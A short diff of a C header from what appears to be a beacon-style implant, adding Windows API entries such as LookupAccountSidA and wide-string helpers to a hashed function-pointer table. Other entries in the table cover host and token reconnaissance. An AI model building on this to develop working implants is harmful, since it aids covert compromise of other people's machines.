@@ -16,6 +16,9 @@
 #include "hashes.h"
 #include "apidef.h"
 
+
+#pragma intrinsic( wcsrchr );
+
 typedef struct
 {
 	ULONG BeaconId;
@@ -31,7 +34,10 @@ typedef struct
 
 	struct
 	{
+		FUNC( wcslen );
 		FUNC( GetACP );
+		FUNC( wcsrchr );
+		FUNC( wcstombs );
 		FUNC( GetOEMCP );
 		FUNC( LocalLock );
 		FUNC( LocalFree );
@@ -57,6 +63,7 @@ typedef struct
 		FUNC( GetComputerNameA );
 		FUNC( CryptSetKeyParam );
 		FUNC( CryptGetHashParam );
+		FUNC( LookupAccountSidA );
 		FUNC( CryptDecodeObjectEx );
 		FUNC( GetCurrentProcessId );
 		FUNC( GetTokenInformation );
